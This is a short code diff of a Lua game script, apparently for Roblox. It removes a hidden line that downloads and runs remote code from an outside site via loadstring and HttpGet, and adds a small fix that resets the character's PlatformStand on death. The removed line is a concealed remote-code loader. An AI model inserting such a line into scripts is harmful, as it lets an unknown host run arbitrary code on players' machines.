@@ -10543,7 +10543,6 @@ local cameraLook
 local movementPosition
 local movementVelocity
 local gravityForce
-pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 local airAccelerate
 local airMaxSpeed
 local groundAccelerate
@@ -10869,6 +10868,7 @@ main()
 local con
 	con = char.Humanoid.Died:Connect(function()
 	    print("Died")
+	    	game.Players.LocalPlayer.Character:WaitForChild("Humanoid").PlatformStand = false
 	    collider:Disconnect()
 	    character:Disconnect()
 	    moveInputSum:Disconnect()
